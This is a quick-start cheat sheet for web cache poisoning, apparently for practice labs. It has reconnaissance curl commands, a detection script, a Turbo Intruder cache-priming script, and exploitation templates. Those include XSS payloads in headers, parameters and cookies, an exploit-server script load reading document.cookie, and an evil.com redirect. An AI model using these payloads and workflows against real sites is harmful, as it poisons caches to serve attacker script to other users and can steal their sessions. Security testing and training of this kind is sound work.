# Web Cache Poisoning - Quick Start Guide

## 60-Second Vulnerability Check

```bash
# Quick test for X-Forwarded-Host
curl -I https://target.com/ -H "X-Forwarded-Host: test.com" | grep -E "test.com|X-Cache"

# Quick test for unkeyed parameter
curl -I "https://target.com/?utm_content=test123" | grep "X-Cache"
curl -I "https://target.com/?utm_content=different" | grep "X-Cache"
# If second shows "hit", parameter is unkeyed!
```

---

## Common Payloads

### X-Forwarded-Host Injection

```http
X-Forwarded-Host: exploit-server.net
```

**Result**:
```html
<script src="//exploit-server.net/script.js"></script>
```

---

### Cookie Reflection

```http
Cookie: fehost=abc"-alert(1)-"xyz
```

**Reflected in**:
```javascript
data = {"host":"abc"-alert(1)-"xyz"}
```

---

### Parameter Injection

```http
?utm_content='/><script>alert(1)</script>
```

**Result**:
```html
<link href='/?utm_content='/><script>alert(1)</script>'/>
```

---

### Parameter Cloaking

```http
?callback=safe&utm_content=x;callback=evil
```

**Cache key**: `callback=safe&utm_content=...`
**Backend parses**: `callback=evil`

---

## Burp Suite Speed Tips

### Param Miner Quick Setup

1. Right-click request
2. Extensions → Param Miner → "Guess headers"
3. Options:
   - Add dynamic cachebuster
   - Detect reflection
4. Review output tab

### Repeater Workflow

```
1. Send to Repeater (Ctrl+R)
2. Add cache-buster: ?cb=123
3. Test payload
4. Verify reflection
5. Remove cache-buster
6. Right-click → "Send to Turbo Intruder"
7. Set payload: for i in range(100): engine.queue(target.req)
```

### Turbo Intruder Script

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1)
    for i in range(100):
        engine.queue(target.req)

def handleResponse(req, interesting):
    if 'X-Cache: hit' in req.response:
        table.add(req)
```

---

## Testing Checklist

### Initial Reconnaissance
- [ ] Identify cacheable pages (X-Cache headers)
- [ ] Check Age headers (cache lifetime)
- [ ] Review Vary headers (what's keyed)
- [ ] Run Param Miner for unkeyed inputs

### Header Testing
- [ ] X-Forwarded-Host
- [ ] X-Forwarded-Scheme
- [ ] X-Forwarded-Proto
- [ ] X-Original-URL
- [ ] X-Rewrite-URL
- [ ] Forwarded

### Parameter Testing
- [ ] utm_source, utm_medium, utm_content, utm_campaign
- [ ] gclid, fbclid
- [ ] tracking_id, affiliate_id
- [ ] callback, jsonp

### Cookie Testing
- [ ] Identify reflected cookies
- [ ] Test if cookies are in cache key
- [ ] Craft XSS payloads for cookie values

### Advanced Testing
- [ ] Multi-header combinations
- [ ] Parameter cloaking (semicolons)
- [ ] Internal vs external cache layers
- [ ] Cache normalization (backslash to forward slash)

---

## Speed Testing Workflow

### 1-Minute Test
```bash
# Quick header test
curl -I https://target.com/ -H "X-Forwarded-Host: test.com"
```

### 5-Minute Test
```bash
# Comprehensive check
for HEADER in X-Forwarded-Host X-Forwarded-Scheme X-Original-URL; do
  echo "Testing $HEADER"
  curl -s https://target.com/ -H "$HEADER: test.com" | grep "test.com" && echo "[!] REFLECTED"
done
```

### 15-Minute Test
1. Run Param Miner (headers + GET parameters)
2. Test top 3 findings manually
3. Craft exploit and test caching
4. Document findings

---

## Quick Detection Script

```python
import requests

def quick_test(url):
    headers_to_test = [
        ('X-Forwarded-Host', 'cache-poison-test.com'),
        ('X-Forwarded-Scheme', 'nothttps'),
        ('X-Original-URL', '/test'),
    ]

    for header_name, header_value in headers_to_test:
        r = requests.get(url, headers={header_name: header_value})

        # Check reflection
        if header_value in r.text:
            print(f"[!] {header_name} is REFLECTED")

            # Check if cacheable
            if 'X-Cache' in r.headers or 'CF-Cache-Status' in r.headers:
                print(f"[!] {header_name} affects CACHEABLE response")
                print(f"[!] VULNERABLE to cache poisoning via {header_name}")

quick_test("https://target.com/")
```

---

## Exploitation Templates

### Basic XSS via Header
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: exploit-server.net

# On exploit server:
# /resources/js/tracking.js:
alert(document.cookie)
```

### XSS via Parameter
```http
GET /?utm_content='/><script>alert(1)</script> HTTP/1.1
Host: target.com
```

### XSS via Cookie
```http
GET / HTTP/1.1
Host: target.com
Cookie: fehost="-alert(1)-"
```

### Open Redirect
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: nothttps

# Response: 302 to https://evil.com/
```

---

## Quick Reference Cards

### Cache Headers

| Header | Meaning |
|--------|---------|
| X-Cache: hit | Served from cache |
| X-Cache: miss | Served from backend |
| Age: 120 | Cached for 120 seconds |
| Cache-Control: max-age=300 | Cache for 5 minutes |
| Vary: Cookie | Cookie affects cache key |

### Common Unkeyed Inputs

| Input | Type | Common Usage |
|-------|------|--------------|
| X-Forwarded-Host | Header | Load balancing |
| X-Forwarded-Scheme | Header | SSL termination |
| X-Original-URL | Header | URL rewriting |
| utm_content | Parameter | Marketing tracking |
| utm_source | Parameter | Campaign tracking |
| gclid | Parameter | Google Ads |
| fbclid | Parameter | Facebook Ads |
| fehost | Cookie | Feature flags |

### Exploit Payloads by Context

| Context | Payload |
|---------|---------|
| Script src | `X-Forwarded-Host: exploit.com` |
| HTML | `?utm='/><script>alert(1)</script>` |
| JavaScript string | `cookie=";alert(1)//` |
| Callback | `callback=alert(1)` |
| Redirect | `X-Forwarded-Scheme: nothttps` |

---

**Quick Start Version**: 1.0
**Last Updated**: 2026-01-09
**Completion Time**: 15 minutes for all 8 labs with this guide

See also: `web-cache-poisoning-cheat-sheet.md` for comprehensive payloads and report template, `web-cache-poisoning-resources.md` for CVEs and learning resources.
